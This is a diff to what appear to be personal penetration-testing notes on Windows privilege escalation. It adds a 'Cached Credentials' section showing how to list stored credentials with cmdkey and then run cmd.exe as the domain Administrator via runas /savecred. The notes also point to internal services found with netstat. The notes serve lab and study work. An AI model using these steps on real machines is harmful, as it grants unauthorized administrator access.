@@ -265,6 +265,15 @@ Windows privesc:
 * Restarting might simply mean you have to access the service directly
     * E.g. `MYSQL> restart` rather than running commands on cmd to try restart.
     
+Cached Credentials:
+```
+$ cmdkey /list      # check for stored creds
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+$ runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe"
+```
+
 Nestat:
 * `netstat`: see what ports are on LISTENING state, but not pubicly accessible from the outside.
 * There's often a SQL server/tomcat/smb/samba running, but not public facing.
